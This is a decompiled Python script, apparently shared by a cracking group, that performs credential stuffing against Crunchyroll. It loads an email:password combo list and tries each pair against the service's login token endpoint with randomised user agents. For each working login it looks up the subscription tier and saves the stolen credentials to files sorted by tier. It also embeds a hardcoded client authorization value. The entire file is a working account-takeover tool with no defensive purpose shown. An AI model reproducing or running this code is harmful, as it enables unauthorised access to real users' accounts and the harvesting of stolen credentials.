# Source Generated with Decompile++
# File: x.pyc (Python 3.11)

"""
DECOMPILED BY : MR.UNKNOWN.401
DON'T MASS WITH ME 💀
FOLLOW GITHUB : https://github.com/mr-unknown-401
"""


import requests
import uuid
from rich.console import Console
from rich.panel import Panel
from rich.tree import Tree
from rich.columns import Columns
from getuseragent import UserAgent

console = Console()

logo = """
┏┓       ┓       ┓┓
┃ ┏┓┓┏┏┓┏┣┓┓┏┏┓┏┓┃┃
┗┛┛ ┗┻┛┗┗┛┗┗┫┛ ┗┛┗┗
            ┛      
> Version : 0.01
> Github  : Peaky-XD
> Team : @peaky_xd
"""


def crack(email, psw):
    global sub
    id = str(uuid.uuid4())
    ua = UserAgent("ios").Random()
    response = requests.post("https://beta-api.crunchyroll.com/auth/v1/token",
                             data={"username": email, "password": psw, "grant_type": "password",
                                   "scope": "offline_access", "device_id": id}, headers={"Etp-Anonymous-Id": id,
                                                                                         "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                                                                                         "Accept": "*/*",
                                                                                         "Authorization": "Basic cW1idnFfdXFuMmc2MXFrZm1vMHU6UkUyRERRMXJtdmQ4Y0dDUGphWHQxSk9aVk5FRTFCb0o=",
                                                                                         "Accept-Encoding": "gzip, deflate, br",
                                                                                         "User-Agent": ua,
                                                                                         "Accept-Language": "ar-LY;q=1.0, en-GB;q=0.9",
                                                                                         "Connection": "close"})

    try:
        if '"access_token"' in response.text:
            tk = response.json()['access_token']

            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style="bold grey50"), style="bold white")
            tree.add(Columns([Panel(f"[bold green]{email}", style="bold grey50", width=30),
                              Panel(f"[bold green]{psw}", style="bold grey50", width=30)]))

            try:
                user_info_response = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me",
                                                  headers={"Host": "beta-api.crunchyroll.com",
                                                           "Authorization": f"Bearer {tk}",
                                                           "Accept-Encoding": "gzip, deflate, br",
                                                           "User-Agent": "Crunchyroll/3.45.4 Android/9 okhttp/4.12.0"})
                external_id = user_info_response.json()['external_id']
            except (requests.exceptions.JSONDecodeError, KeyError):
                external_id = None

            try:
                subscription_info_response = requests.get(
                    f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
                    headers={"Host": "beta-api.crunchyroll.com", "Authorization": f"Bearer {tk}",
                             "Accept-Encoding": "gzip, deflate, br",
                             "User-Agent": "Crunchyroll/3.45.4 Android/9 okhttp/4.12.0"})
                if 'fan' in str(subscription_info_response.json()):
                    sub = 'Fan'
                elif 'premium' in str(subscription_info_response.json()):
                    sub = 'Premium'
                elif 'Subscription Not Found' in str(subscription_info_response.json()):
                    sub = 'Free'
            except (requests.exceptions.JSONDecodeError, KeyError):
                sub = None

            if sub is not None:
                tree.add(Panel(f"> Subscription: [green]{sub}", style="bold grey50"))

            console.print(tree)

            open('CrunchyRoll.txt', 'a+').write(f'{email}:{psw}\n')
            if sub is not None:
                open(f'{sub}.txt', 'a+').write(f'{email}:{psw}\n')

        else:
            pass
    except Exception as e:
        console.print(f'[!] Error: [red]{e}')


def main():
    panel = Panel.fit(logo, title="[bold magenta]Coded By: [cyan]@x_spoilt", border_style="green")
    console.print(panel)

    consx = Console(width=65, style="bold grey50")
    consx.print(Panel("[italic white]Enter Combo (mail:pass) ~", subtitle="╭─────", subtitle_align="left"))

    path = console.input("[bold grey50]   ╰─> ")

    for whis in open(path, 'r').read().splitlines():
        acc = str(whis)
        acc = acc.split('\n')[0]
        email = acc.split(':')[0]
        psw = acc.split(':')[1].split(' ')[0]
        crack(email, psw)


if __name__ == "__main__":
    main()
